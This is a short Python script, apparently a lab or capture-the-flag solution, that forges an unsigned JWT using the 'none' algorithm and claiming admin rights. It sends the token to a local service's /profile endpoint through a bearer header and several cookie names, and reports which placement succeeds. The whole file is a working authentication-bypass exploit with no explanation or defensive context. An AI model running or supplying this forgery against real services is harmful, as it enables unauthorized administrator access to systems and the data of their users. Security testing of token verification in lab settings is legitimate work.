import base64, json, requests

def b64u_j(s):
    return base64.urlsafe_b64encode(json.dumps(s, separators=(',',':')).encode()).decode().rstrip('=')

header = {"alg":"none","typ":"JWT"}
payload = {"username":"admin","is_admin":True}
token_none = b64u_j(header) + '.' + b64u_j(payload) + '.'

base_url = 'http://localhost:5003'

places = [
    ('header', {'Authorization': f'Bearer {token_none}'}, None),
    ('cookie_token', None, {'token': token_none}),
    ('cookie_jwt', None, {'jwt': token_none}),
    ('cookie_auth', None, {'auth_token': token_none}),
]

for name, headers, cookies in places:
    r = requests.get(base_url + '/profile', headers=headers or {}, cookies=cookies or {}, allow_redirects=False)
    print(name, r.status_code, r.headers.get('Location'), len(r.content))
    if r.status_code == 200:
        print('SUCCESS', name)
        print(r.text[:1000])
        break
